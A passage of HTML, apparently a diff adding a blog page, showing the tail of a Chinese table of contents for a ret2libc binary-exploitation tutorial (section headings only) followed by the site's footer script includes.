href="#%E8%A7%A3%E5%86%B3%E5%A4%9A%E4%B8%AAlibc-so%E7%89%88%E6%9C%AC%E4%BE%9B%E9%80%89%E6%8B%A9"><span class="nav-number">5.6.2.</span> <span class="nav-text">解决多个libc.so版本供选择</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%F0%9F%94%81-%E6%80%BB%E7%BB%93%E5%AF%B9%E6%AF%94%EF%BC%88%E9%87%8D%E7%82%B9%E6%9D%A5%E4%BA%86%EF%BC%81%EF%BC%89"><span class="nav-number">5.6.3.</span> <span class="nav-text">🔁 总结对比（重点来了！）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2libc3-x64"><span class="nav-number">5.7.</span> <span class="nav-text">ret2libc3_x64</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC-7"><span class="nav-number">5.7.1.</span> <span class="nav-text">脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1"><span class="nav-number">5.7.2.</span> <span class="nav-text">堆栈平衡</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F"><span class="nav-number">6.</span> <span class="nav-text">注意</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A1%AB%E5%85%85%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80"><span class="nav-number">6.1.</span> <span class="nav-text">填充返回地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E5%A4%84%E7%90%86"><span class="nav-number">6.2.</span> <span class="nav-text">返回地址处理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0%E7%9A%84%E4%BC%A0%E9%80%92%E7%9A%84%E5%8F%82%E6%95%B0"><span class="nav-number">6.3.</span> <span class="nav-text">查看调用函数的传递的参数</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+            
+<script src="/js/post/share.js"></script>
+
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+</body>
+</html>
